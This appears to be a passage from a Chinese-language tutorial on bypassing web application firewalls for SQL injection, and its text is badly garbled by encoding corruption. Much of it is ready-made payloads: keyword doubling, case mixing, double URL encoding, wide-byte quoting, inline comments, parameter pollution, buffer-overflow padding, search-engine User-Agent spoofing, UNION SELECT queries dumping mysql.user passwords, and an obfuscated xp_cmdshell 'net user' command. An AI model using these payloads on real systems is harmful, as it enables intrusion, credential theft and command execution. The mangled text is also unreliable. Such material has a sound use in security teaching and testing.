iPä¸´æ—¶é»‘åå•åŠŸèƒ½ï¼Œä»¥åŠå®ç°äº†é’ˆå¯¹æŸä¸ªåŠŸèƒ½çš„iPç™½åå•åŠŸèƒ½ã€‚åŒæ—¶ï¼Œçˆ¬è™«ç™½åå•æä¾›çˆ¬è™«ä¿¡ä»»æœºåˆ¶ï¼Œåœ¨å‡ºç°è¯¯æ‹¦æˆªæƒ…å†µä¸‹ï¼Œå…è®¸ç”¨æˆ·è‡ªå®šä¹‰çˆ¬è™«ä¿¡ä»»ã€‚ ğŸƒ wafæ³¨å…¥ç»•è¿‡æ£€æµ‹æ–¹æ³• äº‘wafç›´æ¥æ‰¾çœŸå®ipå°±å¯ç»•è¿‡ 1. åŒå†™ç»•è¿‡â€¢ ä¸¾ä¾‹ï¼š?id=1 â€¢ è®¿é—®?id=1 and 1=1 é¡µé¢æŠ¥é”™ 1=1ï¼Œå‘ç°andè¢«è¿‡æ»¤ï¼Œè¿™æ—¶å€™å°è¯•ä½¿ç”¨åŒå†™ çš„æ–¹å¼ç»•è¿‡ï¼Œå¦‚aanndd 1=1ï¼Œå½“andè¢«è¿‡æ»¤åï¼Œaannddå˜æˆäº†andï¼Œæ‰€ä»¥ è¿™æ—¶ä¼ è¾“æ•°æ®åº“çš„è¯­å¥æ˜¯and 1=1 ï¼Œå¦‚æœå½“è®¿é—® order by é”™è¯¯ä¿¡æ¯ä¸ºâ€›der byâ€›è¿™å‘ç°è¿‡æ»¤äº†orï¼Œè¿™åŒå†™orï¼Œåé¢æ³¨å…¥å’Œunionæ³¨å…¥çš„ä¸€è‡´ã€‚ 2. å¤§å°å†™ç»•è¿‡â€¢ å¤§å°å†™ç»•è¿‡ç”¨äºåªé’ˆå¯¹å°å†™æˆ–å¤§å†™çš„å…³é”®å­—åŒ¹é…æŠ€æœ¯ï¼Œæ­£åˆ™è¡¨è¾¾å¼ /express/i å¤§å°å†™ä¸æ•æ„Ÿå³æ— æ³•ç»•è¿‡ï¼Œè¿™æ˜¯æœ€ç®€å•çš„ç»•è¿‡æŠ€æœ¯ â€¢ ä¸¾ä¾‹ï¼šz.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 â€¢ ç¤ºä¾‹åœºæ™¯å¯èƒ½çš„æƒ…å†µä¸ºfilterçš„è§„åˆ™é‡Œæœ‰å¯¹å¤§å°å†™è½¬æ¢çš„å¤„ç†ï¼Œä½†ä¸æ˜¯æ¯ä¸ª å…³é”®å­—æˆ–æ¯ç§æƒ…å†µéƒ½æœ‰å¤„ç† 3. æ›¿æ¢å…³é”®å­—â€¢ è¿™ç§æƒ…å†µä¸‹å¤§å°å†™è½¬åŒ–æ— æ³•ç»•è¿‡ï¼Œè€Œä¸”æ­£åˆ™è¡¨è¾¾å¼ä¼šæ›¿æ¢æˆ–åˆ é™¤selectã€ unionè¿™äº›å…³é”®å­—ï¼Œå¦‚æœåªåŒ¹é…ä¸€æ¬¡å°±å¾ˆå®¹æ˜“ç»•è¿‡ â€¢ ä¸¾ä¾‹ï¼šz.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 â€¢ åŒæ ·æ˜¯å¾ˆåŸºç¡€çš„æŠ€æœ¯ï¼Œæœ‰äº›æ—¶å€™ç”šè‡³æ„é€ å¾—æ›´å¤æ‚ï¼šSeLSeselectleCTecTï¼Œ ä¸å»ºè®®å¯¹æ­¤æŠ±å¤ªå¤§æœŸæœ› 4. ç¼–ç ç»•è¿‡æ³¨å…¥URLç¼–ç  è®¿é—®id=1â€™,å‘ç°é¡µé¢æŠ¥å‡ºMysqlé”™è¯¯ï¼Œæ¥ç€è®¿é—®id=1 and 1=1 å’Œid=1 and 1=2 æ—¶ï¼Œå‘ç°andè¢«æ‹¦æˆªï¼Œå°è¯•ä½¿ç”¨URLå…¨ç¼–ç çš„æ–¹å¼ç»•è¿‡æ‹¦æˆªã€‚ç”±äºæœåŠ¡å™¨ä¼š è‡ªåŠ¨å¯¹URLè¿›è¡Œä¸€æ¬¡URLç¼–ç ï¼Œæ‰€ä»¥éœ€è¦æŠŠå…³é”®å­—ç¼–ç ä¸¤æ¬¡ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼ŒURLç¼–ç éœ€è¦é€‰æ‹©å…¨ç¼–ç ï¼Œè€Œä¸æ˜¯æ™®é€šçš„URLç¼–ç ã€‚ å¦‚ï¼š å…³é”®å­—andè¿›è¡Œä¸¤æ¬¡URLå…¨ç¼–ç çš„ç»“æœæ˜¯%25%36%31%25%36%65%25%36%34ï¼Œ è®¿é—®id=1 %25%36%31%25%36%65%25%36%34 1=1æ—¶ï¼Œé¡µé¢è¿”å›å’Œid=1ç›¸åŒï¼Œ è®¿é—®id=1 %25%36%31%25%36%65%25%36%34 1=2æ—¶ï¼Œå’Œid=1ä¸åŒï¼Œæ‰€ä»¥è¯¥é¡µé¢ä¸€å®šå­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚ åé¢çš„æ³¨å…¥è¿‡ç¨‹ä¸unionæ³¨å…¥ä¸€è‡´ï¼Œåªéœ€åˆ¤æ–­è¿‡æ»¤çš„å…³é”®è¯ï¼Œå¹¶ç»è¿‡ä¸¤æ¬¡URL å…¨ç¼–ç å³å¯ã€‚ åå…­è¿›åˆ¶ç¼–ç target.com/index.php?page_id=-15 /!u%6eion/ /!se%6cect/ 1,2,3,4â€¦ SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) ç¤ºä¾‹ä»£ç ä¸­ï¼Œå‰è€…æ˜¯å¯¹å•ä¸ªå­—ç¬¦åå…­è¿›åˆ¶ç¼–ç ï¼Œåè€…åˆ™æ˜¯å¯¹æ•´ä¸ªå­—ç¬¦ä¸²ç¼–ç  Unicodeç¼–ç â€¢ Unicodeæœ‰æ‰€è°“çš„æ ‡å‡†ç¼–ç å’Œéæ ‡å‡†ç¼–ç ï¼Œå‡è®¾æˆ‘ä»¬ç”¨çš„utf-8ä¸ºæ ‡å‡†ç¼–ç ï¼Œé‚£ä¹ˆè¥¿æ¬§è¯­ç³»æ‰€ä½¿ç”¨çš„å°±æ˜¯éæ ‡å‡†ç¼–ç äº† â€¢ çœ‹ä¸€ä¸‹å¸¸ç”¨çš„å‡ ä¸ªç¬¦å·çš„ä¸€äº›Unicodeç¼–ç ï¼š â€¢ å•å¼•å·: %u0027ã€%u02b9ã€%u02bcã€%u02c8ã€%u2032ã€%uff07ã€%c0%27ã€%c0%a7ã€%e0%80%a7 â€¢ ç©ºæ ¼ï¼š%u0020ã€%uff00ã€%c0%20ã€%c0%a0ã€%e0%80%a0 â€¢ å·¦æ‹¬å·ï¼š%u0028ã€%uff08ã€%c0%28ã€%c0%a8ã€%e0%80%a8 â€¢ å³æ‹¬å·ï¼š%u0029ã€%uff09ã€%c0%29ã€%c0%a9ã€%e0%80%a9 â€¢ ä¸¾ä¾‹ï¼š?id=1%D6â€˜%20AND%201=2%23 â€¢ SELECT â€˜Ã„â€™=â€˜Aâ€™; #1 â€¢ ä¸¤ä¸ªç¤ºä¾‹ä¸­ï¼Œå‰è€…åˆ©ç”¨åŒå­—èŠ‚ç»•è¿‡ï¼Œæ¯”å¦‚å¯¹å•å¼•å·è½¬ä¹‰æ“ä½œå˜æˆâ€™ï¼Œé‚£ä¹ˆå°±å˜æˆäº†%D6%5Câ€™ï¼Œ%D6%5Cæ„æˆäº† ä¸€ä¸ªå®½å­—èŠ‚å³Unicodeå­—èŠ‚ï¼Œå•å¼•å·å¯ä»¥æ­£å¸¸ä½¿ç”¨ â€¢ ç¬¬äºŒä¸ªç¤ºä¾‹ä½¿ç”¨çš„æ˜¯ä¸¤ç§ä¸åŒç¼–ç çš„å­—ç¬¦çš„æ¯”è¾ƒï¼Œå®ƒä»¬æ¯”è¾ƒçš„ç»“æœå¯èƒ½æ˜¯Trueæˆ–è€…Falseï¼Œå…³é”®åœ¨äºUnicode ç¼–ç ç§ç±»ç¹å¤šï¼ŒåŸºäºé»‘åå•çš„è¿‡æ»¤å™¨æ— æ³•å¤„ç†æ‰€ä»¥æƒ…å†µï¼Œä»è€Œå®ç°ç»•è¿‡ â€¢ å¦å¤–å¹³æ—¶å¬å¾—å¤šä¸€ç‚¹çš„å¯èƒ½æ˜¯utf-7çš„ç»•è¿‡ï¼Œè¿˜æœ‰utf-16ã€utf-32çš„ç»•è¿‡ï¼Œåè€…ä»æˆåŠŸçš„å®ç°å¯¹googleçš„ç»•è¿‡ï¼Œ æœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥å»äº†è§£ä¸‹ â€¢ å¸¸è§çš„ç¼–ç å½“ç„¶è¿˜æœ‰äºŒè¿›åˆ¶ã€å…«è¿›åˆ¶ï¼Œå®ƒä»¬ä¸ä¸€å®šéƒ½æ´¾å¾—ä¸Šç”¨åœºï¼Œä½†åé¢ä¼šæåˆ°ä½¿ç”¨äºŒè¿›åˆ¶çš„ä¾‹ 5. ä½¿ç”¨æ³¨é‡Šæ™®é€šæ³¨é‡Š â€¢ å¸¸è§çš„ç”¨äºæ³¨é‡Šçš„ç¬¦å·ï¼š //, â€“ , /**/, #, â€“ +, â€“ - , ; ï¼Œ â€“ a â€¢ ä¸¾ä¾‹ï¼šz.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4 â€¢ â€˜union%a0select pass from users# â€¢ /**/åœ¨æ„é€ å¾—æŸ¥è¯¢è¯­å¥ä¸­æ’å…¥æ³¨é‡Šï¼Œè§„é¿å¯¹ç©ºæ ¼çš„ä¾èµ–æˆ–å…³é”®å­—è¯†åˆ«;#ã€-+ç”¨äºç»ˆç»“è¯­å¥çš„æŸ¥è¯¢ å†…è”æ³¨é‡Š â€¢ ç›¸æ¯”æ™®é€šæ³¨é‡Šï¼Œå†…è”æ³¨é‡Šç”¨çš„æ›´å¤šï¼Œå®ƒæœ‰ä¸€ä¸ªç‰¹æ€§/!**/åªæœ‰MySQLèƒ½è¯†åˆ« â€¢ ä¸¾ä¾‹ï¼š index.php?page_id=-15 /!UNION/ /!SELECT/ 1,2,3 â€¢ ?page_id=null%0A///!50000%55nIOn//yoyu/all//%0A/!%53eLE ct/%0A/nnaa/+1,2,3,4â€¦ â€¢ ä¸¤ä¸ªç¤ºä¾‹ä¸­å‰è€…ä½¿ç”¨å†…è”æ³¨é‡Šï¼Œåè€…è¿˜ç”¨åˆ°äº†æ™®é€šæ³¨é‡Šã€‚ä½¿ç”¨æ³¨é‡Šä¸€ä¸ªå¾ˆæœ‰ç”¨çš„åšæ³•ä¾¿æ˜¯å¯¹å…³é”®å­—çš„æ‹†åˆ†ï¼Œè¦åšåˆ°è¿™ä¸€ç‚¹åé¢è®¨è®ºçš„ç‰¹æ®Šç¬¦å·ä¹Ÿèƒ½å®ç°ï¼Œå½“ç„¶å‰ææ˜¯åŒ…æ‹¬/ã€*åœ¨å†…çš„è¿™äº›å­—ç¬¦èƒ½æ­£å¸¸ä½¿ç”¨ 6. ç­‰ä»·å‡½æ•°ä¸å‘½ä»¤æŸäº›å‡½æ•°æˆ–å‘½ä»¤ï¼Œå› ä¸ºWAFçš„è¿‡æ»¤æœºåˆ¶å¯¼è‡´æˆ‘ä»¬æ— æ³•ä½¿ç”¨ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•ç”¨ä¸€äº›ç­‰ä»·å‡½æ•°æ¥æ›¿ä»£å®ƒä»¬ 1.å‡½æ•°æˆ–å˜é‡â€¢ hex()ã€bin() ==&gt; ascii() â€¢ sleep() ==&gt;benchmark() â€¢ concat_ws()==&gt;group_concat() â€¢ mid()ã€substr() ==&gt; substring() â€¢ @@user ==&gt; user() â€¢ @@datadir ==&gt; datadir() 2.ç¬¦å·â€¢ andå’Œoræœ‰å¯èƒ½ä¸èƒ½ä½¿ç”¨ï¼Œæˆ–è€…å¯ä»¥è¯•ä¸‹&amp;&amp;å’Œ||èƒ½ä¸èƒ½ç”¨ï¼›è¿˜æœ‰=ä¸èƒ½ä½¿ç”¨çš„æƒ…å†µï¼Œå¯ä»¥è€ƒè™‘å°è¯•&lt;ã€&gt;ï¼Œå› ä¸ºå¦‚æœä¸å°äºåˆä¸å¤§äºï¼Œé‚£ä¾¿ç­‰äºäº† â€¢ å¦‚ id=1 or 1=1 å¯ä»¥æ¢æˆ id=1 or 1!=2 â€¢ åœ¨çœ‹ä¸€ä¸‹ç”¨å¾—å¤šçš„ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹ç¬¦å·è¡¨ç¤ºå…¶ä½œç”¨ï¼š%20 %09 %0a %0b %0c %0d %a0 /**/ 3.ç”Ÿåƒ»å‡½æ•° â€¢ MySQL/PostgreSQLæ”¯æŒXMLå‡½æ•°ï¼šSelect UpdateXML(â€˜ â€™,â€™/script/@x/â€™,â€™src=//evil.comâ€™); â€¢ ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) â€¢ SELECT xmlelement(name img,xmlattributes(1as src,â€™a\\l\\x65rt(1)â€™as \\117n\\x65rror)); //postgresql â€¢ ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); ã€ â€¢ MySQLã€PostgreSQLã€Oracleå®ƒä»¬éƒ½æœ‰è®¸å¤šè‡ªå·±çš„å‡½æ•°ï¼ŒåŸºäºé»‘åå•çš„ filterè¦æƒ³æ¶µç›–è¿™ä¹ˆå¤šä¸œè¥¿ä»å®é™…ä¸Šæ¥è¯´ä¸å¤ªå¯èƒ½ï¼Œè€Œä¸”ä»£ä»·å¤ªå¤§ï¼Œçœ‹æ¥é»‘åå•æŠ€æœ¯åˆ°ä¸€å®šç¨‹åº¦ä¾¿é‡åˆ°äº†é™åˆ¶ã€‚ 7. ç‰¹æ®Šç¬¦å·â€¢ è¿™é‡ŒæŠŠéå­—æ¯æ•°å­—çš„å­—ç¬¦éƒ½è§„åœ¨äº†ç‰¹æ®Šç¬¦å·ä¸€ç±»ï¼Œç‰¹æ®Šç¬¦å·æœ‰ç‰¹æ®Šçš„å«ä¹‰å’Œç”¨æ³•ï¼Œæ¶‰åŠä¿¡æ¯é‡æ¯”å‰é¢æåˆ°çš„å‡ ç§éƒ½è¦å¤š â€¢ å‡ ä¸ªä¾‹å­ï¼š â€¢ 1.ä½¿ç”¨åå¼•å·ï¼Œä¾‹å¦‚select version()`ï¼Œå¯ä»¥ç”¨æ¥è¿‡ç©ºæ ¼å’Œæ­£åˆ™ï¼Œç‰¹æ®Šæƒ…å†µä¸‹è¿˜å¯ä»¥å°†å…¶åšæ³¨é‡Šç¬¦ç”¨ â€¢ 2.ç¥å¥‡çš„â€-+.â€ï¼Œselect+id-1+1.from users; â€š+â€›æ˜¯ç”¨äºå­—ç¬¦ä¸²è¿æ¥çš„ï¼Œâ€›-â€›å’Œâ€›.â€› åœ¨æ­¤ä¹Ÿç”¨äºè¿æ¥ï¼Œå¯ä»¥é€ƒè¿‡ç©ºæ ¼å’Œå…³é”®å­—è¿‡æ»¤ â€¢ 3.@ç¬¦å·ï¼Œselect@^1.from users; @ç”¨äºå˜é‡å®šä¹‰å¦‚@ var_name ï¼Œä¸€ä¸ª@è¡¨ç¤ºç”¨æˆ·å®šä¹‰ï¼Œ@@è¡¨ç¤ºç³»ç»Ÿå˜é‡ â€¢ 4.Mysql function() as xxx ä¹Ÿå¯ä¸ç”¨aså’Œç©ºæ ¼ select-count(id)test from users; //ç»•è¿‡ç©ºæ ¼é™åˆ¶ â€¢ å‘æŒ¥å¤§ä½œç”¨çš„å­—ç¬¦(æœªåŒ…æ‹¬â€™ã€*ã€/ç­‰åœ¨å†…ï¼Œè€ƒè™‘åˆ°å‰é¢å·²ç»å‡ºç°è¾ƒå¤šæ¬¡äº†)ï¼š `ã€~ã€!ã€@ã€%ã€()ã€[]ã€.ã€-ã€+ ã€|ã€%00 8. HTTPå‚æ•°æ§åˆ¶â€¢ é€šè¿‡æä¾›å¤šä¸ªå‚æ•°=ç›¸åŒåç§°çš„å€¼é›†æ¥æ··æ·†WAFã€‚ä¾‹å¦‚ http://example.com?id=1&amp;?id=â€™ or â€˜1â€™=â€™1â€² â€“ â€˜åœ¨æŸäº›æƒ…å†µä¸‹ï¼ˆä¾‹å¦‚ä½¿ç”¨ Apache/PHPï¼‰ï¼Œåº”ç”¨ç¨‹åºå°†ä»…è§£ææœ€åï¼ˆç¬¬äºŒä¸ªï¼‰ id= è€ŒWAFåªè§£æç¬¬ä¸€ ä¸ªã€‚åœ¨åº”ç”¨ç¨‹åºçœ‹æ¥è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªåˆæ³•çš„è¯·æ±‚ï¼Œå› æ­¤åº”ç”¨ç¨‹åºä¼šæ¥æ”¶å¹¶å¤„ç†è¿™äº›æ¶æ„è¾“å…¥ã€‚å¦‚ä»Šï¼Œå¤§å¤šæ•°çš„WAFéƒ½ä¸ä¼šå—åˆ°HTTPå‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰ çš„å½±å“ï¼Œä½†ä»ç„¶å€¼å¾—ä¸€è¯•ã€‚ â€¢ 1.HPP(HTTP Parameter Polution) â€¢ ä¸¾ä¾‹ï¼š /?id=1;select+1,2,3+from+users+where+id=1â€“ 1 /?id=1;select+1&amp;id=2,3+from+users+where+id=1â€“ 1 /?id=1/**/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users â€¢ HPPåˆç§°åšé‡å¤å‚æ•°æ±¡æŸ“ï¼Œæœ€ç®€å•çš„å°±æ˜¯?uid=1&amp;uid=2&amp;uid=3ï¼Œå¯¹äºè¿™ç§ æƒ…å†µï¼Œä¸åŒçš„WebæœåŠ¡å™¨å¤„ç†æ–¹å¼å¦‚ä¸‹ 2.HPF(HTTP Parameter Fragment) â€¢ è¿™ç§æ–¹æ³•æ˜¯HTTPåˆ†å‰²æ³¨å…¥ï¼ŒåŒCRLFæœ‰ç›¸ä¼¼ä¹‹å¤„(ä½¿ç”¨æ§åˆ¶å­—ç¬¦%0aã€%0dç­‰æ‰§è¡Œæ¢è¡Œ) â€¢ ä¸¾ä¾‹ï¼š â€¢ /?a=1+union/&amp;b=/select+1,pass/&amp;c=/from+usersâ€“ 1 â€¢ select * from table where a=1 union/* and b=/select 1,pass/ limit */from usersâ€” â€¢ çœ‹ç½¢ä¸Šé¢ä¸¤ä¸ªç¤ºä¾‹ï¼Œå‘ç°å’ŒHPPæœ€åä¸€ä¸ªç¤ºä¾‹å¾ˆåƒï¼Œä¸åŒä¹‹å¤„åœ¨äºå‚æ•°ä¸ ä¸€æ ·ï¼Œè¿™é‡Œæ˜¯åœ¨ä¸åŒçš„å‚æ•°ä¹‹é—´è¿›è¡Œåˆ†å‰²ï¼Œåˆ°äº†æ•°æ®åº“æ‰§è¡ŒæŸ¥è¯¢æ—¶å†åˆå¹¶ è¯­å¥ã€‚ â€¢ 3.HPC(HTTP Parameter Contamination) â€¢ RFC2396å®šä¹‰äº†å¦‚ä¸‹ä¸€äº›å­—ç¬¦ï¼š â€¢ Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * â€™ () Reserved : ; / ? : @ &amp; = + $ , Unwise : { } | \\ ^ [ ] ` ä¸åŒçš„WebæœåŠ¡å™¨å¤„ç†å¤„ç†æ„é€ å¾—ç‰¹æ®Šè¯·æ±‚æ—¶æœ‰ä¸åŒçš„é€»è¾‘ï¼š ä»¥é­”æœ¯å­—ç¬¦%ä¸ºä¾‹ï¼ŒAsp/Asp.netä¼šå—åˆ°å½±å“ 9. ç¼“å†²åŒºæº¢å‡º(Advanced)â€¢ ç¼“å†²åŒºæº¢å‡ºç”¨äºå¯¹ä»˜WAFï¼Œæœ‰ä¸å°‘WAFæ˜¯Cè¯­è¨€å†™çš„ï¼Œè€ŒCè¯­è¨€è‡ªèº«æ²¡æœ‰ç¼“å†²åŒºä¿æŠ¤æœºåˆ¶ï¼Œå› æ­¤å¦‚æœWAFåœ¨å¤„ç†æµ‹è¯•å‘é‡æ—¶è¶…å‡ºäº†å…¶ç¼“å†²åŒºé•¿åº¦ï¼Œå°±ä¼šå¼•å‘bugä»è€Œå®ç°ç»•è¿‡ â€¢ ä¸¾ä¾‹ï¼š â€¢ ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,1 3,14,15,16,17,18,19,20,21,22,23,24,25,26 â€¢ ç¤ºä¾‹0xA*1000æŒ‡0xAåé¢â€›Aâ€é‡å¤1000æ¬¡ï¼Œä¸€èˆ¬æ¥è¯´å¯¹åº”ç”¨è½¯ä»¶æ„æˆç¼“å†²åŒºæº¢å‡ºéƒ½éœ€è¦è¾ƒå¤§çš„æµ‹è¯•é•¿åº¦ï¼Œè¿™é‡Œ1000åªåšå‚è€ƒï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½ä¸éœ€è¦è¿™ä¹ˆé•¿ä¹Ÿèƒ½æº¢å‡º 10. æ•´åˆç»•è¿‡â€¢ æ•´åˆçš„æ„æ€æ˜¯ç»“åˆä½¿ç”¨å‰é¢è°ˆåˆ°çš„å„ç§ç»•è¿‡æŠ€æœ¯ï¼Œå•ä¸€çš„æŠ€æœ¯å¯èƒ½æ— æ³•ç»•è¿‡è¿‡æ»¤æœºåˆ¶ï¼Œä½†æ˜¯å¤šç§æŠ€æœ¯çš„é…åˆä½¿ç”¨æˆåŠŸçš„å¯èƒ½æ€§å°±ä¼šå¢åŠ ä¸å°‘äº†ã€‚è¿™ä¸€æ–¹é¢æ¥è¯´æ˜¯æ€»ä½“ä¸å±€éƒ¨å’Œçš„å…³ç³»ï¼Œå¦ä¸€æ–¹é¢åˆ™æ˜¯å¤šç§æŠ€æœ¯çš„ä½¿ç”¨åˆ›é€ äº†æ›´å¤šçš„å¯èƒ½æ€§ï¼Œ é™¤éæ¯ä¸€ç§æŠ€æœ¯å•ç‹¬éƒ½æ— æ³•ä½¿ç”¨ï¼Œå¦åˆ™å®ƒä»¬èƒ½äº§ç”Ÿæ¯”è‡ªèº«å¤§å¾—å¤šçš„èƒ½é‡ã€‚ â€¢ target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 â€œAâ€)..])+/!uNIOn/+/!SeLECt/+1,2,3,4â€¦ â€¢ id=1/!UnIoN/+SeLeCT+1,2,concat(/!table_name/)+FrOM /information_schema/.tables /!WHERE /+/!TaBlE_ScHeMa/+like+database()â€“ - â€¢ ?id=5+/!UNION/+/!SELECT/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/!INFORMATIO N_SCHEM/.COLUMNS+WHERE+TABLE_NAME=0x41646d696eâ€“ WAFèº«ä»½è®¤è¯é˜¶æ®µçš„ç»•è¿‡â€‹ WAFæ˜¯æœ‰ä¸€ä¸ªç™½åå•çš„ï¼Œåœ¨ç™½åå•å†…çš„å®¢æˆ·è¯·æ±‚å°†ä¸åšæ£€æµ‹ ğŸ§¨ç»•è¿‡æ–¹æ³•ä¸€ï¼šä¼ªé€ æœç´¢å¼•æ“ï¼ˆä¸€èˆ¬ä¸å­˜åœ¨ï¼‰è€ç‰ˆæœ¬çš„WAFæ˜¯æœ‰è¿™ä¸ªæ¼æ´çš„ï¼Œå°±æ˜¯æŠŠUser-Agentä¿®æ”¹ä¸ºæœç´¢å¼•æ“ï¼Œå¯ä»¥é€šè¿‡ç«ç‹ä¿®æ”¹ä¹Ÿå¯ä»¥é€šè¿‡burpä¿®æ”¹ï¼›æˆ‘è¿™é‡Œç”¨åˆ°burp å°†å…¶å€¼è®¾ä¸ºè‡ªå·±æƒ³è¦çš„UserAgentï¼ˆå¦‚:Baiduspiderï¼‰ å¦‚æœæƒ³æ‰¹é‡æ›¿æ¢User_Agentï¼Œ ğŸ§¨ç»•è¿‡æ–¹æ³•äºŒï¼šä¼ªé€ ç™½åå•ç‰¹æ®Šç›®å½•ï¼ˆä¸€èˆ¬éœ€è¦å¼€å‘äººå‘˜åŠ å…¥ç™½åå•ï¼Œå¦åˆ™ä¸è¡Œï¼Œä»¥å‰çš„é»˜è®¤ï¼‰ 360webscanè„šæœ¬å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºadmin dede installç­‰ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸åšæ‹¦æˆª æ¯”å¦‚ï¼šwww.spisec.com/pen/news.php?id=1 union select user,password from mysql.user å¯ä»¥æ”¹ä¸º: www.spisec.com/pen/news.php/admin?id=1 union select user,password from mysql.user æˆ–è€… www.spisec.com/pen/admin/..\\news.php id=1 union select user,password from mysql.user ğŸ§¨ç»•è¿‡æ–¹æ³•ä¸‰ï¼šç›´æ¥æ”»å‡»æºç«™ è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨äºå®‰å…¨å®ã€åŠ é€Ÿä¹ç­‰äº‘WAFï¼Œäº‘WAFçš„åŸç†é€šè¿‡DNSè§£æåˆ°äº‘WAFï¼Œè®¿é—®ç½‘ç«™çš„æµé‡è¦ç»è¿‡æŒ‡å®šçš„DNSæœåŠ¡å™¨è§£æï¼Œç„¶åè¿›å…¥WAFèŠ‚ç‚¹è¿›è¡Œè¿‡æ»¤ï¼Œæœ€åè®¿é—®åŸå§‹æœåŠ¡å™¨ï¼Œå¦‚æœæˆ‘ä»¬èƒ½é€šè¿‡ä¸€äº›æ‰‹æ®µï¼ˆæ¯”å¦‚cæ®µã€ç¤¾å·¥ï¼‰æ‰¾åˆ°åŸå§‹çš„æœåŠ¡å™¨åœ°å€ï¼Œä¾¿å¯ä»¥ç»•è¿‡ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¤ªå¥½çš„ä¾‹å­ï¼Œå°±ä¸å¤šåšè¯´æ˜äº†ã€‚ ğŸ§µWAFæ•°æ®åŒ…è§£æé˜¶æ®µçš„ç»•è¿‡ï¼ˆ1ï¼‰ç¼–ç ç»•è¿‡æœ€å¸¸è§çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå¯ä»¥è¿›è¡Œurlencode ç°åœ¨ä¸€èˆ¬ä¸è¡Œ ï¼ˆ2ï¼‰ä¿®æ”¹è¯·æ±‚æ–¹å¼ç»•è¿‡å¾ˆå¤šaspã€aspxç½‘ç«™éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œä¸€èˆ¬åªé˜²getæ³¨å…¥è€Œcookieä¸postæ³¨å…¥ä¸è¿›è¡Œè¿‡æ»¤é˜²å¾¡ å‰ææ˜¯ä»£ç æ¥å—requestè¯·æ±‚ ï¼ˆ3ï¼‰å¤å‚æ•°ç»•è¿‡ ä¾‹å¦‚ä¸€ä¸ªè¯·æ±‚æ˜¯è¿™æ ·çš„ GET/pen/news.php?id=1 union select user,password from mysql.user å¯ä»¥ä¿®æ”¹ä¸º GETpen/news.php?id=1&amp;id=union&amp;id=select&amp;id=user,password&amp;id=from%20mysql.user å¾ˆå¤šWAFéƒ½å¯ä»¥è¿™æ ·ç»•ï¼Œæµ‹è¯•æœ€æ–°ç‰ˆWAFèƒ½ç»•è¿‡éƒ¨åˆ†è¯­å¥ ï¼ˆ4ï¼‰WAFè§¦å‘è§„åˆ™çš„ç»•è¿‡WAFåœ¨è¿™é‡Œä¸»è¦æ˜¯é’ˆå¯¹ä¸€äº›ç‰¹æ®Šçš„å…³é”®è¯æˆ–è€…ç”¨æ³•è¿›è¡Œæ£€æµ‹ã€‚ç»•è¿‡æ–¹æ³•å¾ˆå¤šï¼Œä¹Ÿæ˜¯æœ€æœ‰æ•ˆçš„ã€‚ ç»•è¿‡ç­–ç•¥ä¸€ï¼šç‰¹æ®Šå­—ç¬¦æ›¿æ¢ç©ºæ ¼ï¼ˆæœ€æ–°wafä¼šè¢«æ‹¦æˆªï¼‰ ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦ä»£æ›¿ç©ºæ ¼ï¼Œæ¯”å¦‚åœ¨mysqlä¸­%0aæ˜¯æ¢è¡Œï¼Œå¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥éƒ¨åˆ†ç»•è¿‡æœ€æ–°ç‰ˆæœ¬çš„WAFï¼Œåœ¨sqlserverä¸­å¯ä»¥ç”¨/**/ä»£æ›¿ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š http://192.168.0.142:8080/sql.php?id=1/|%23â€“%23|/union/|%23â€“%23|/select/|%23â€“%23|/1,user(),3,4,5 http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2 ç»•è¿‡ç­–ç•¥äºŒï¼šç‰¹æ®Šå­—ç¬¦æ‹¼æ¥ æŠŠç‰¹æ®Šå­—ç¬¦æ‹¼æ¥èµ·æ¥ç»•è¿‡WAFçš„æ£€æµ‹ï¼Œæ¯”å¦‚åœ¨Mysqlä¸­ï¼Œå¯ä»¥åˆ©ç”¨æ³¨é‡Š/**/æ¥ç»•è¿‡ï¼Œåœ¨mssqlä¸­ï¼Œå‡½æ•°é‡Œé¢å¯ä»¥ç”¨+æ¥æ‹¼æ¥ å¦‚ï¼šGET /pen/news.php?id=1;exec(master..xp_cmdshell â€˜netuserâ€™) å¯ä»¥æ”¹ä¸ºï¼šGET /pen/news.php?id=1;exec(â€˜masteâ€™+â€™r..xpâ€™+â€™_cmdshellâ€™+â€™â€net userâ€â€˜) ç»•è¿‡ç­–ç•¥ä¸‰ï¼šæ³¨é‡ŠåŒ…å«å…³é”®å­— 